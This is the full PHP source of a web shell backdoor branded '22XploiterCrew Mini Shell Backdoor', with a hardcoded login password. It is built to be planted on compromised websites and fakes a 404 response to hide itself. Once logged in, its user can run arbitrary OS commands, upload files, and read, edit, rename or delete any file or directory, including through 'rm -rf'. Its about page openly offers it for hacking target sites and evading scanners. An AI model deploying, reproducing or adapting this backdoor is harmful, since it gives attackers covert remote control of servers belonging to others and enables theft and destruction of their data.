<?php
/**
 * 22XploiterCrew Mini Shell Backdoor
 * 
 * @author  RandsX
 * @team    22XploiterCrew
 */
$Password = "RandsX";
session_start();
http_response_code(404);
######### Login Shell ###########
function Login($msg = null) {
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="author" content="RandsX">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
  <link rel="icon" type="image/png" href="https://avatars3.githubusercontent.com/u/53482167?s=460&v=4"/>
  <title>22XploiterCrew Shell Backdoor</title>
  <style type="text/css" media="all">
    body {
      background-color: #000000;
    }
    ::placeholder {
      color: white !important;
    }
  </style>
</head>
<body>
  <?php if($msg !== null) : ?>
  <script type="text/javascript" charset="utf-8">
    alert("<?= $msg ?>");
  </script>
  <?php endif; ?>
  <div class="container mt-4">
    <h2 class="text-light text-center">22XploiterCrew</h2>
    <img src="https://cdn.pixabay.com/photo/2012/05/07/02/49/pirate-47705_960_720.png" class="mx-auto d-block" width="300" height="200">
    <form method="post" class="mt-3">
      <div class="input-group mb-3">
        <input type="text" class="form-control bg-transparent text-light border-bottom rounded-0" style="border:0;box-shadow:none;" placeholder="Password" name="password_form" required="required">
        <div class="input-group-append">
          <button class="btn border-bottom text-light" type="submit" name="login" style="border:0;box-shadow:none;">>></button>
        </div>
      </div>
    </form>
  </div>
</body>
</html>
<?php
  exit;
} // Close function login;
# Cek session user login
if (!isset($_SESSION[base64_encode($_SERVER["HTTP_HOST"])])) {
  if((isset($_POST["login"]))){
    if ($_POST["password_form"] == $Password) {
      $_SESSION[base64_encode($_SERVER["HTTP_HOST"])] = true;
    } else {
      Login("Password is invalid");
    }
  }else{
    Login();
  }
}
# Function lib
function permission($file){
	$permission = fileperms($file);
	if (($permission & 0xC000) == 0xC000) {
		$result = 's';
	} elseif (($permission & 0xA000) == 0xA000) {
		$result = 'l';
	} elseif (($permission & 0x8000) == 0x8000) {
		$result = '-';
	} elseif (($permission & 0x6000) == 0x6000) {
		$result = 'b';
	} elseif (($permission & 0x4000) == 0x4000) {
		$result = 'd';
	} elseif (($permission & 0x2000) == 0x2000) {
		$result = 'c';
	} elseif (($permission & 0x1000) == 0x1000) {
		$result = 'p';
	} else {
		$result = 'u';
	}
	$result .= (($permission & 0x0100) ? 'r' : '-');
	$result .= (($permission & 0x0080) ? 'w' : '-');
	$result .= (($permission & 0x0040) ?
	(($permission & 0x0800) ? 's' : 'x' ) :
	(($permission & 0x0800) ? 'S' : '-'));
	$result .= (($permission & 0x0020) ? 'r' : '-');
	$result .= (($permission & 0x0010) ? 'w' : '-');
	$result .= (($permission & 0x0008) ?
	(($permission & 0x0400) ? 's' : 'x' ) :
	(($permission & 0x0400) ? 'S' : '-'));
	$result .= (($permission & 0x0004) ? 'r' : '-');
	$result .= (($permission & 0x0002) ? 'w' : '-');
	$result .= (($permission & 0x0001) ?
	(($permission & 0x0200) ? 't' : 'x' ) :
	(($permission & 0x0200) ? 'T' : '-'));
	return $result;
}
function path($pathName = null, $type = "str") {
  if (isset($_GET["path"])) {
    $path = $_GET["path"];
  } else {
    $path = getcwd();
  }
  $path = str_replace("\\","/",$path);
  $paths = explode("/", $path);
  if($type == "str") {
    return $path . $pathName;
  } elseif($type == "arr") {
    return $paths;
  }
}
function redirect($to) {
  echo "<script>document.location.href = '".$to."'</script>";
}
function exe($cmd) {
	if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result) {
			$buff .= $result;
		} return $buff;
	} elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif(function_exists('shell_exec')) {
		$buff = @shell_exec($cmd);
		return $buff;
	}
}
function files() {
  $file = explode('/', $_GET["file"]);
  return $file;
};
$Shell = function() { ?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=0.80, shrink-to-fit=no">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://rawcdn.githack.com/RandsX/Highlight-JavaScript/0a08485660a5ce6a99fda735c57b4a7cdf281171/styles/monokai-sublime.css">
  <link rel="stylesheet" href="https://rawcdn.githack.com/RandsX/Textarea-Line/a7b8ad93e95caed275ef4a244522d363d4a0ebd4/css/TextareaLine.min.css">
  <title>22XploiterCrew Mini Shell Backdoor</title>
  <style type="text/css" media="all">
    body {
      background-color: #000000;
      color: white;
    }
    nav.navbar {
      position: fixed;
      width: 100%;
      z-index: 999;
    }
    .body {
      position: absolute;
      width: 100%;
      top: 60px;
    }
    .table > tbody > tr > * {
      color: #fff;
      vertical-align: middle;
    }
    ::placeholder {
      color: white !important;
    }
    #editor {
      background-color: white;
      border: 1px solid black;
      position: relative;
      height: 300px;
    }
    a {
      color: white;
    }
    .custom-file-input:lang(en)~.custom-file-label::after {
      content: "";
    }
    .custom-file-label::after {
      height: 0;
      padding: 0;
    }
  </style>
  <script src="https://rawcdn.githack.com/RandsX/Highlight-JavaScript/0a08485660a5ce6a99fda735c57b4a7cdf281171/highlight.pack.js"></script>
  <script src="https://rawcdn.githack.com/RandsX/Textarea-Line/a7b8ad93e95caed275ef4a244522d363d4a0ebd4/js/TextareaLine.min.js"></script>
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
  <script>
    hljs.initHighlightingOnLoad();
  </script>
</head>
<body onload="TextareaLine.appendLineNumber('Editor');">
  <nav class="navbar border-bottom bg-dark">
    <a href="" class="navbar-brand text-light">22XploiterCrew</a>
    <button class="navbar-toggler text-light" data-toggle="collapse" type="button" data-target="#menu"><i class="fa fa-wrench"></i></button>
    <div class="collapse navbar-collapse" id="menu">
      <div class="table-responsive-lg text-center mt-2">
        <a href="?" class="badge my-2 p-2 badge-secondary"><i class="fa fa-home"></i> Home</a>
        <a href="?about" class="badge my-2 p-2 badge-primary"><i class="fa fa-info-circle"></i> About</a>
        <a href="?keluar" class="badge my-2 p-2 badge-danger"><i class="fa fa-sign-out"></i> Keluar</a>
      </div>
    </div>
  </nav>
  <div class="px-3 py-2 body">
    <?php if(!isset($_GET["about"])): ?>
    <div class="text-light border px-2 table-responsive-lg mb-3">
      <div class="">
        <ul style="list-style:none;margin:0;padding:0;">
          <li>
            Uname : <?= php_uname() ?>
          </li>
        </ul>
       <nav aria-label="breadcrumb" class="table-responsive-lg m-0 p-0">
      <ol class="breadcrumb bg-transparent mb-0 p-0">
        <span class="text-light mr-3">Path : </span>
      <?php
        foreach (path(null, "arr") as $key => $value) {
          if ($value == "" && $key == 0) {
            echo "<a href=\"?path=/\" class=\"mr-2 text-light\">/</a>";
            continue;
          }
          if($value == "") continue;
          echo "<li class=\"breadcrumb-item\"><a class=\"text-light\" href=\"?path=";
          for($i=0; $i<=$key; $i++) {
            echo path(null, "arr")[$i];
            if($i != $key) echo "/";
          }
          echo "\">".$value."</a>";
        }
      ?>
      </ol>
    </nav>
      </div>
      <hr class="border">
      <div class="row">
        <div class="col-md-6">
          <form method="post">
            <div class="input-group mb-3">
              <input type="text" class="form-control bg-transparent text-light border-bottom rounded-0" style="border:0;box-shadow:none;padding:0;" placeholder="Command" name="command" required="required">
              <div class="input-group-append">
                <button class="btn border-bottom text-light" type="submit" name="cmd" style="border:0;box-shadow:none;">>></button>
              </div>
            </div>
          </form>
        </div>
        <div class="col-md-6">
          <form method="post" enctype="multipart/form-data">
            <div class="input-group mb-3">
              <div class="custom-file">
                <input type="hidden" name="tool" value="upload">
                <input type="file" class="custom-file-input" name="file" id="files">
                <label class="custom-file-label bg-transparent text-light rounded-0" for="files">Choose file</label>
              </div>
              <div class="input-group-append">
                <button class="btn border rounded-0 text-light" type="submit" style="box-shadow:none;">Upload</button>
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>
  <?php if(isset($_POST["cmd"])): ?>
  <span class="text-light">Command : <?= $_POST["command"] ?></span>
  <pre><code class="bash"><?= exe($_POST["command"]) ?></code></pre>
  <?php endif; ?>
  <?php 
    if(isset($_FILES["file"])){
      if(@copy($_FILES['file']['tmp_name'], path("/".$_FILES['file']['name']))){
        echo "<script>
        swal({
          title: \"Success\",
          text: \"File upload successfully!\",
          icon: \"success\",
          button: \"Back\",
        })
        .then((upload) => {
          if (upload) {
            document.location.href = \"?path=".path()."\"
          }
        });
        </script>";
      } else {
        echo "<script>
        swal({
          title: \"Error\",
          text: \"File failed to upload!\",
          icon: \"error\",
          button: \"Back\",
        })
        .then((upload) => {
          if (upload) {
            document.location.href = \"?path=".path()."\"
          }
        });
        </script>";
      }
    }
  ?>
  <?php
    if(isset($_GET["keluar"])) {
      session_destroy();
      redirect("?");
    }
  ?>
  <?php if($_GET["type"] == "file" && $_GET["action"] == "view"): ?>
  <hr class="border">
  <div class="text-center mb-2">
    [ <a href="#" class="text-warning">View</a> ]
    [ <a href="<?= "?path=".path()."&action=edit&type=file&file=".$_GET["file"] ?>">Edit</a> ]
    [ <a href="<?= "?path=".path()."&action=rename&type=file&file=".$_GET["file"] ?>">Rename</a> ]
    [ <a href="<?= "?path=".path()."&action=delete&type=file&file=".$_GET["file"] ?>">Delete</a> ]
  </div>
    <span>File : <?= end(files()); ?></span>
    <pre><code class="<?= $_GET["ext"] ?>"><?= htmlspecialchars(file_get_contents($_GET["file"])) ?></code></pre>
  <?php endif; ?>
  <?php if($_GET["type"] == "file" && $_GET["action"] == "edit"): ?>
  <hr class="border">
  <div class="text-center mb-2">
    [ <a href="<?= "?path=".path()."&action=view&type=file&file=".$_GET["file"] ?>">View</a> ]
    [ <a href="#" class="text-warning">Edit</a> ]
    [ <a href="<?= "?path=".path()."&action=rename&type=file&file=".$_GET["file"] ?>">Rename</a> ]
    [ <a href="<?= "?path=".path()."&action=delete&type=file&file=".$_GET["file"] ?>">Delete</a> ]
  </div>
      <div class="text-center">
       <input oninput="editor.style.height=this.value+'px';" type="range" value="500" min="100" max="1500" class="custom-range">
      </div>
    <span>File : <?= end(files()); ?></span>
    <form method="post">
      <div id="editor">
        <textarea name="source" id="Editor" rows="3"><?= htmlspecialchars(file_get_contents($_GET["file"])) ?></textarea>
      </div>
      <div class="form-group mt-3">
        <button type="submit" class="btn btn-primary" name="edit_file">Save</button>
      </div>
    </form>
    <hr class="border">
  <?php 
  if(isset($_POST["edit_file"])) {
    $source = $_POST["source"];
    $fopen = fopen($_GET["file"],"w");
    $write = fwrite($fopen, htmlspecialchars_decode($source));
    if($write) {
      echo "<script>
      swal({
        title: \"Success\",
        text: \"File edited successfully!\",
        icon: \"success\",
        button: \"Back\",
      })
      .then((edited) => {
        if (edited) {
          document.location.href = \"?path=".path()."\"
        }
      });
      </script>";
    }
  }
  endif; ?>
  <?php if($_GET["type"] == "file" && $_GET["action"] == "delete"): ?>
    <hr class="border">
    <div class="text-center mb-2">
      [ <a href="<?= "?path=".path()."&action=view&type=file&file=".$_GET["file"] ?>">View</a> ]
      [ <a href="<?= "?path=".path()."&action=edit&type=file&file=".$_GET["file"] ?>">Edit</a> ]
      [ <a href="<?= "?path=".path()."&action=rename&type=file&file=".$_GET["file"] ?>">Rename</a> ]
      [ <a href="#" class="text-warning">Delete</a> ]
    </div>
    <div class="text-center">File : <?= end(files()); ?></div>
    <h4 class="text-center">Are you sure delete this file?</h4>
    <form class="mt-3" method="post">
       <div class="row">
         <div class="col-md-6">
           <div class="form-group">
             <button type="submit" class="btn btn-primary btn-block" name="yes">Yes</button>
           </div>
         </div>
         <div class="col-md-6">
           <div class="form-group">
             <a href="<?= "?path=".path() ?>" class="btn btn-danger btn-block">Cancel</a>
           </div>
         </div>
       </div>
    </form>
    <hr class="border">
  <?php
  if(isset($_POST["yes"])) {
    if (unlink($_GET["file"])) {
      echo "<script>
      swal({
        title: \"Success\",
        text: \"File deleted successfully!\",
        icon: \"success\",
        button: \"Back\",
      })
      .then((deleted) => {
        if (deleted) {
          document.location.href = \"?path=".path()."\"
        }
      });
      </script>";
    } else {
      echo "<script>
      swal({
        title: \"Error\",
        text: \"File failed to delete\",
        icon: \"error\",
        button: \"Back\",
      })
      .then((deleted) => {
        if (deleted) {
          document.location.href = \"?path=".path()."&action=delete&type=file&file=".$_GET['file']."\"
        }
      });
      </script>";
    }
  }
  endif; ?>
  <?php if($_GET["type"] == "file" && $_GET["action"] == "rename"): ?>
  <hr class="border">
  <div class="text-center mb-2">
    [ <a href="<?= "?path=".path()."&action=view&type=file&file=".$_GET["file"] ?>">View</a> ]
    [ <a href="<?= "?path=".path()."&action=edit&type=file&file=".$_GET["file"] ?>">Edit</a> ]
    [ <a href="#" class="text-warning">Rename</a> ]
    [ <a href="<?= "?path=".path()."&action=delete&type=file&file=".$_GET["file"] ?>">Delete</a> ]
  </div>
  <span>File : <?= end(files()); ?></span>
  <form method="post">
    <div class="form-group">
      <input type="text" name="file_name" id="" class="form-control bg-transparent text-light" value="<?= htmlspecialchars($_GET["file"]) ?>">
    </div>
    <div class="form-group">
      <button type="submit" class="btn btn-primary" name="rename_file">Save</button>
    </div>
  </form>
  <?php 
  if(isset($_POST["rename_file"])) {
    $filename = $_POST["file_name"];
   # $rename = rename($filename, $_GET["file"]);
    if (!file_exists($filename)) {
      if (rename($_GET["file"], $filename)) {
        echo "<script>
        swal({
          title: \"Success\",
          text: \"File name changed successfully!\",
          icon: \"success\",
          button: \"Back\",
        })
        .then((edited) => {
          if (edited) {
            document.location.href = \"?path=".path()."\"
          }
        });
        </script>";
      } else {
        echo "<script>
        swal({
          title: \"Error\",
          text: \"The filename failed to change!\",
          icon: \"error\",
          button: \"Back\",
        })
        .then((edited) => {
          if (edited) {
            document.location.href = \"?path=".path()."&action=rename&type=file&file=".$_GET['file']."\"
          }
        });
        </script>";
      }
    } else {
      echo "<script>
        swal({
          title: \"Warning!\",
          text: \"The file name has been used!\",
          icon: \"warning\",
          button: \"Back\",
        })
        .then((edited) => {
          if (edited) {
            document.location.href = \"?path=".path()."&action=rename&type=file&file=".$_GET['file']."\"
          }
        });
        </script>";
    }
  }
  endif; ?>
  <!-- Delete -->
  <?php if($_GET["type"] == "dir" && $_GET["action"] == "delete"): ?>
    <hr class="border">
    <div class="text-center mb-2">
      [ <a href="<?= "?path=".path()."&action=rename&type=dir&dir=".$_GET["dir"] ?>">Rename</a> ]
      [ <a href="#" class="text-warning">Delete</a> ]
    </div>
    <div class="table-responsive-lg text-center">
      <h4>Are you sure delete this Directory <u><?= $_GET["dir"] ?></u> ?</h4>
    </div>
    <form class="mt-3" method="post">
       <div class="row">
         <div class="col-md-6">
           <div class="form-group">
             <button type="submit" class="btn btn-primary btn-block" name="yes">Yes</button>
           </div>
         </div>
         <div class="col-md-6">
           <div class="form-group">
             <a href="<?= "?path=".path() ?>" class="btn btn-danger btn-block">Cancel</a>
           </div>
         </div>
       </div>
    </form>
    <hr class="border">
  <?php
  if(isset($_POST["yes"])) {
    if(is_dir($_GET["dir"])) {
      if (is_writable($_GET["dir"])) {
        @rmdir($_GET["dir"]);
        @exe("rm -rf ".$_GET["dir"]);
        @exe("rmdir /s /q ".$_GET["dir"]);
  		  echo "<script>
        swal({
          title: \"Success\",
          text: \"Directory deleted successfully!\",
          icon: \"success\",
          button: \"Back\",
        })
        .then((deleted) => {
          if (deleted) {
            document.location.href = \"?path=".path()."\"
          }
        });
        </script>";
      } 
    } else {
     echo "<script>
      swal({
        title: \"Warning!\",
        text: \"This is not a Directory\",
        icon: \"warning\",
        button: \"Back\",
      })
      .then((deleted) => {
        if (deleted) {
          document.location.href = \"?path=".path()."\"
        }
      });
      </script>";
    }
  }
  endif; ?>
  <?php if($_GET["type"] == "dir" && $_GET["action"] == "rename"): ?>
  <hr class="border">
  <div class="text-center mb-2">
    [ <a href="#" class="text-warning">Rename</a> ]
    [ <a href="<?= "?path=".path()."&action=delete&type=dir&dir=".$_GET["dir"] ?>">Delete</a> ]
  </div>
  <span>Name : </span>
  <form method="post">
    <div class="form-group">
      <input type="text" name="dir_name" id="" class="form-control bg-transparent text-light" value="<?= htmlspecialchars($_GET["dir"]) ?>">
    </div>
    <div class="form-group">
      <button type="submit" class="btn btn-primary" name="rename_dir">Save</button>
    </div>
  </form>
  <?php 
  if(isset($_POST["rename_dir"])) {
    $dirname = $_POST["dir_name"];
   # $rename = rename($filename, $_GET["file"]);
    if (!file_exists($dirname)) {
      if (rename($_GET["dir"], $dirname)) {
        echo "<script>
        swal({
          title: \"Success\",
          text: \"Directory name changed successfully!\",
          icon: \"success\",
          button: \"Back\",
        })
        .then((edited) => {
          if (edited) {
            document.location.href = \"?path=".path()."\"
          }
        });
        </script>";
      } else {
        echo "<script>
        swal({
          title: \"Error\",
          text: \"The directory name failed to change!\",
          icon: \"error\",
          button: \"Back\",
        })
        .then((edited) => {
          if (edited) {
            document.location.href = \"?path=".path()."&action=rename&type=dir&dir=".$_GET['dir']."\"
          }
        });
        </script>";
      }
    } else {
      echo "<script>
        swal({
          title: \"Warning!\",
          text: \"The directory name has been used!\",
          icon: \"warning\",
          button: \"Back\",
        })
        .then((edited) => {
          if (edited) {
            document.location.href = \"?path=".path()."&action=rename&type=dir&dir=".$_GET['dir']."\"
          }
        });
        </script>";
    }
  }
  endif; ?>
  <?php
  if(is_writable(path()) || is_readable(path())):
    $scandir = scandir(path())
  ?>
   <div class="table-responsive-lg mt-3">
     <table class="table table-sm table-hover table-bordered">
       <thead class="text-center bg-warning">
         <tr>
           <th>Name</th>
           <th>Type</th>
           <th>Size</th>
           <th>Permission</th>
           <th>Action</th>
         </tr>
       </thead>
       <tbody>
       <?php
         foreach(array_diff($scandir, array(".", "..")) as $dir):
           if(!is_dir(path("/$dir"))) continue;
           $size = filesize(path("/$dir"))/1024;
           $size = round($size,3);
           if($size >= 1024){
             $size = round($size/1024,2).' MB';
           }else{
             $size = $size.' KB';
           }
       ?>
         <tr>
           <td><img src="http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png" width="18" class="mr-2"><a href="?path=<?= path("/$dir") ?>" class="text-light"><?= $dir ?></a></td>
           <td class="text-center">Directory</td>
           <td class="text-center"><?= $size ?></td>
           <td class="text-center">
             <?php
               if(is_writable(path("/$dir"))) echo "<font color=\"#00ff00\">";
               if(!is_readable(path("/$dir"))) echo "<font color=\"red\">";
               echo permission(path("/$dir"));;
               if(is_writable(path("/$dir") || !is_readable(path("/$dir")))) echo "</font>";
             ?>
           </td>
           <td class="text-center">
             <a href="<?= "?path=".path()."&action=rename&type=dir&dir=".path("/$dir") ?>" data-toggle="tooltip" data-placement="auto" title="Rename" class="badge mx-1"><i class="fa fa-pencil"></i></a>
             <a href="<?= "?path=".path()."&action=delete&type=dir&dir=".path("/$dir") ?>" data-toggle="tooltip" data-placement="auto" title="Delete" class="badge mx-1"><i class="fa fa-trash"></i>
             </a>
           </td>
         </tr>
       <?php 
         endforeach;
         foreach($scandir as $file):
           if(!is_file(path("/$file"))) continue;
           $size = filesize(path("/$file"))/1024;
           $size = round($size,3);
           if($size >= 1024){
             $size = round($size/1024,2).' MB';
           }else{
             $size = $size.' KB';
           }
       ?>
       <tr>
         <td>
           <?php
             $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
             echo "<img width=\"18\" src=\"";
             if($ext == "php") {
  						echo 'https://image.flaticon.com/icons/png/128/337/337947.png"';
  					}elseif ($ext == "html") {
  						echo 'https://image.flaticon.com/icons/png/128/136/136528.png"';
  					}elseif ($ext == "css") {
  						echo 'https://image.flaticon.com/icons/png/128/136/136527.png"';
  					}elseif ($ext == "png") {
  						echo 'https://image.flaticon.com/icons/png/128/136/136523.png"';
  					}elseif ($ext == "jpg") {
  						echo 'https://image.flaticon.com/icons/png/128/136/136524.png"';
  					}elseif ($ext == "jpeg") {
  						echo 'http://i.imgur.com/e8mkvPf.png"';
  					}elseif($ext == "zip") {
  						echo 'https://image.flaticon.com/icons/png/128/136/136544.png"';
  					}elseif ($ext == "js") {
  						echo 'https://image.flaticon.com/icons/png/128/1126/1126856.png';
  					}elseif ($ext == "ttf") {
  						echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
  					}elseif ($ext == "otf") {
  						echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
  					}elseif ($ext == "txt") {
  						echo 'https://image.flaticon.com/icons/png/128/136/136538.png';
  					}elseif ($ext == "ico") {
  						echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
  					}elseif ($ext == "conf") {
  						echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
  					}elseif ($ext == "htaccess") {
  						echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
  					}elseif ($ext == "sql") {
  						echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
  					}elseif ($ext == "pdf") {
  						echo 'https://image.flaticon.com/icons/png/128/136/136522.png';
  					}elseif ($ext == "md") {
  						echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
  					}else{
  						echo 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';
  					}
  					echo "\">";
           ?>
           <a href="<?= "?path=".path()."&action=view&type=file&file=".path("/$file")."&ext=$ext" ?>" class="text-light"><?= htmlspecialchars($file) ?></a>
           </td>
           <td class="text-center"><?= filetype(path("/$file")) ?></td>
           <td class="text-center"><?= $size ?></td>
           <td class="text-center">
             <?php
               if(is_writable(path("/$dir"))) echo "<font color=\"#00ff00\">";
               if(!is_readable(path("/$dir"))) echo "<font color=\"red\">";
               echo permission(path("/$dir"));;
               if(is_writable(path("/$dir") || !is_readable(path("/$dir")))) echo "</font>";
             ?>
           </td>
           <td class="text-center">
             <a href="<?= "?path=".path()."&action=rename&type=file&file=".path("/$file") ?>" class="badge mx-1"  data-toggle="tooltip" data-placement="auto" title="Rename"><i class="fa fa-pencil"></i></a>
             <a href="<?= "?path=".path()."&action=edit&type=file&file=".path("/$file") ?>" class="badge mx-1" data-toggle="tooltip" data-placement="auto" title="Edit"><i class="fa fa-edit"></i></a>
             <a href="<?= "?path=".path()."&action=delete&type=file&file=".path("/$file") ?>" class="badge mx-1"  data-toggle="tooltip" data-placement="auto" title="Delete"><i class="fa fa-trash"></i></a>
           </td>
         </tr>
       <?php endforeach; ?>
       </tbody>
     </table>
   </div>
   <div class="row">
     <div class="col-md-6">
       <form method="post">
         <div class="input-group mb-3">
          <input type="text" class="form-control bg-transparent text-light border rounded-0" style="box-shadow:none;" placeholder="Folder Name" name="folder_name" required="required">
          <div class="input-group-append">
            <button class="btn border rounded-0 text-light" type="submit" name="make_folder" style="border:0;box-shadow:none;">Confirm</button>
          </div>
        </div>
       </form>
     </div>
     <div class="col-md-6">
       <form method="post">
         <div class="input-group mb-3">
          <input type="text" class="form-control bg-transparent text-light border rounded-0" style="box-shadow:none;" placeholder="File Name" name="file_name" required="required">
          <div class="input-group-append">
            <button class="btn border rounded-0 text-light" type="submit" name="make_file" style="border:0;box-shadow:none;">Confirm</button>
          </div>
        </div>
       </form>
     </div>
   </div>
   <?php
     if(isset($_POST["make_folder"])) {
      $folder = $_POST['folder_name'];
			$folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $folder);
			if (is_writable(path()) && mkdir($folder)) {
			  echo "<script>
        swal({
          title: \"Success\",
          text: \"Directory ".$folder." successfully created\",
          icon: \"success\",
          button: \"Back\",
        })
        .then((make_dir) => {
          if (make_dir) {
            document.location.href = \"?path=".path()."\"
          }
        });
        </script>";
			} else {
			  echo "
			  <script>
			  swal({
          title: \"Error\",
          text: \"Directory ".$folder." error created\",
          icon: \"error\",
          button: \"Back\",
        })
        .then((make_dir) => {
          if (make_dir) {
            document.location.href = \"?path=".path()."\"
          }
        });
        </script>";
			}
     }
     if(isset($_POST["make_file"])) {
       $file = $_POST['file_name'];
       $file = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $file);
       if (!file_exists(path("/$file"))) {
         if (is_writable(path())&&file_put_contents(path("/$file"),$file)) {
  			  echo "<script>
          swal({
            title: \"Success\",
            text: \"File ".$file." successfully created\",
            icon: \"success\",
            button: \"Back\",
          })
          .then((make_file) => {
            if (make_file) {
              document.location.href = \"?path=".path()."&action=edit&type=file&file=".path("/$file")."\"
            }
          });
          </script>";
			  } else {
  			  echo "
  			  <script>
  			  swal({
            title: \"Error\",
            text: \"File ".$file." error created\",
            icon: \"error\",
            button: \"Back\",
          })
          .then((make_file) => {
            if (make_file) {
              document.location.href = \"?path=".path()."\"
            }
          });
          </script>";
  			}
       } else {
         echo "
  			  <script>
  			  swal({
            title: \"Error\",
            text: \"The file name has been used\",
            icon: \"error\",
            button: \"Back\",
          })
          .then((make_file) => {
            if (make_file) {
              document.location.href = \"?path=".path()."\"
            }
          });
          </script>";
       }
     }
   ?>
   <?php else: ?>
   <div style="color:red;">
     Error, directory <b><u><?= path() ?></u></b> is not writable or readable.
   </div>
   <?php endif; else: ?>
    <div class="container mt-4">
    <h2 class="text-light text-center">22XploiterCrew Mini Shell Backdoor v1.2</h2>
    <img src="https://cdn.pixabay.com/photo/2012/05/07/02/49/pirate-47705_960_720.png" class="mx-auto d-block" width="300" height="200">
    <hr class="border">
    <p>
      This is a backdoor shell that is used for hacking purposes and anti-scanned by google or other hackers, this backdoor shell was created because of the many requests that came from our YouTube subscribers. This backdoor shell is equipped with several hacking tools that make it easy for you to hack the target site that has an embedded backdoor shell. <br> This backdoor shell made by CEO-LEADER 22XploiterCrew Mini and it is also open source for everyone, so you can re-edit this shell as you like and on the condition that you don't delete the author that has been set. Thank you for your participation. <br> Social Media : <br> 
      <ul>
        <li>Instagram : _sndrx</li>
        <li>Youtube : 22XploiterCrew</li>
        <li>Site : <a href="" target="_blank" style="text-decoration:underline;">22XploiterCrew</a> and <a href="" target="_blank" style="text-decoration:underline;">Hackers Zone</a></li>
      </ul>
      <br> <center>&copy; 2020  22XploiterCrew Mini - CodeX By RandsX</center>
    </p>
  </div>
   <?php endif; ?>
 </div>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" integrity="sha384-w1Q4orYjBQndcko6MimVbzY0tgp4pWB4lZ7lr30WKz0vr/aWKhXdBNmNb5D92v7s" crossorigin="anonymous"></script>
<script>
  $('[data-toggle="tooltip"]').tooltip();
  		$('#files').change(function() {
			fullPath = $(this).val();
			if (fullPath) {
				var startIndex = (fullPath.indexOf('\\') >= 0 ? fullPath.lastIndexOf('\\'): fullPath.lastIndexOf('/'));
				var filename = fullPath.substring(startIndex);
				if (filename.indexOf('\\') === 0 || filename.indexOf('/') === 0) {
					filename = filename.substring(1);
				}
				$('.custom-file-label').html(filename);
			}
		});
</script>
</body>
</html>
<?php };
$Shell();